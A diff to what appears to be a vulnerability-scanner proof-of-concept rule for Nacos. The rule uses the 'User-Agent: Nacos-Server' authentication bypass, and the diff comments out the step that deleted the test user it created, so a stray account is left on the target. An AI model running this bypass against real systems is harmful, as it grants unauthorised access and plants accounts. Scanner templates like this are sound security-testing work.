@@ -24,11 +24,11 @@ rules:
             headers:
                 User-Agent: Nacos-Server
         expression: response.status == 200 && response.body.bcontains(bytes(r1))
-    r2:
-        request:
-            method: DELETE
-            path: /nacos/v1/auth/users?username={{r1}}
-            headers:
-                User-Agent: Nacos-Server
-        expression: response.status == 200 && response.body.bcontains(bytes("delete user ok!"))
-expression: r0() && r1() && r2()
+    # r2:
+    #     request:
+    #         method: DELETE
+    #         path: /nacos/v1/auth/users?username={{r1}}
+    #         headers:
+    #             User-Agent: Nacos-Server
+    #     expression: response.status == 200 && response.body.bcontains(bytes("delete user ok!"))
+expression: r0() && r1() 
